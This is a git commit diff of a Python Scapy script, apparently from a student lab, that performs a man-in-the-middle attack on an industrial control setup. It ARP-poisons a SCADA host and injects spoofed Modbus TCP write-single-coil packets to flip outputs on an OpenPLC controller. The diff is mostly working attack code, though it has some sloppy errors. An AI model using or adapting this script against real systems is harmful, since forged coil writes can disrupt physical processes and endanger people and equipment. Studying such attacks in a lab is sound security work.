534271f7b92e1ad1f41cd4bd10f14a4c0e203dbb
JinYuan-alt <232499R@mymail.nyp.edu.sg>
2025-04-08 10:42:22 +0800

    Huge CHange

--- Modbus_Inject_Scapy.py
+++ Modbus_Inject_Scapy.py
@@ -2,43 +2,47 @@ from scapy.all import *
 from scapy.all import sendp
 from scapy.layers.inet import IP, TCP
 from scapy.layers.l2 import Ether, ARP
+from scapy.contrib.modbus import *
 import struct, threading, os
 
 # Enable IP forwarding (to avoid DoS)
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-TargetIP = "192.168.254.10"
-
+TargetIP = "192.168.163.130"
 TargetPort = 502
-print("----------ModBus Injection Attack-----------")
-TransactionID= int(input("Enter TransactionID here: ")) #arbitrary value
-ProtocolID = 0 #this is always 0. No need to change
-RCAdd= int(input("Enter Register/Coil Address: "))#change to real register address
-Func_code= int(input("Enter Function codes(1-6): "))
-UnitID= int(input("Enter Unit ID (1-247): ")) #range can be from 1-247 usually doesn't matter.
-         # Change value automatically if attack fails
-
-#Length = (Size of Modbus PDU) + 1 (for Unit ID)
-SCADA_SOURCE_IP=input("Enter SCADA IP: ")
-SCADA_SOURCE_ARP=input("Enter SCADA MAC: ")
+SCADA_IP="192.168.254.20"
+SCADA_MAC=input("Enter SCADA MAC: ")
+OPLC_MAC=input("Enter OpenPLC MAC: ")
+Coil_Address=int(input("Enter Coil address to attack"))
+Output_Val=int(input("Enter 1 or 0 to write to coil: "))
+# Destination
+target_ip = "192.168.254.10"
+target_port = 502  # Standard Modbus TCP port
 
 def poison():
-    arp_poison = ARP(op=2, pdst=SCADA_SOURCE_IP, psrc=TargetIP, hwdst="get mac of SCADA")
+    arp_poison = ARP(op=2, pdst=SCADA_IP, psrc=TargetIP, hwdst=SCADA_MAC)
     sendp(arp_poison, iface="eth0", loop=True, inter=1)
+# Build Modbus payload
+def packet():
+    modbus_packet = (
+            IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags="S")
+    # TCP 3-way if you want to be proper
+    )
 
-def Packet():
-    modbus_pdu = (
-        struct.pack(">BHH", Func_code, RCAdd, 1)
+    # Raw Modbus payload (write coil at address )
+    mb_payload = (
+            ModbusADURequest(transId=RandShort(), unitId=1) /
+            ModbusPDU05WriteSingleCoilRequest(outputAddress=Coil_Address, outputValue=Output_Val)
     )
-    mbap_header = (
-        struct.pack(">HHHB", TransactionID, ProtocolID, 6, UnitID)
-    )
-    modbus_tcp_payload = mbap_header + modbus_pdu
-    ether = Ether(src=SCADA_SOURCE_ARP, dest="mac OpenPLC")
-    ip = IP(src=SCADA_SOURCE_IP,dst=TargetIP)
-    tcp = TCP(dport=TargetPort, sport=RandShort(), flags="PA")  # PUSH+ACK
-    packet = ether /ip / tcp / modbus_tcp_payload
-    send(packet, verbose=True)
+
+    ether=Ether(src=SCADA_MAC, dest=OPLC_MAC)
+    ip=IP(src=SCADA_IP, dst=target_ip)
+    tcp=TCP(dport=target_port,sport=RandShort(),flags="PA")
+    # Full TCP Modbus frame
+    pkt = ether / ip / tcp / mb_payload
+
+    # Send
+    send(pkt)
 
 threading.Thread(target=poison, daemon=True).start()
 
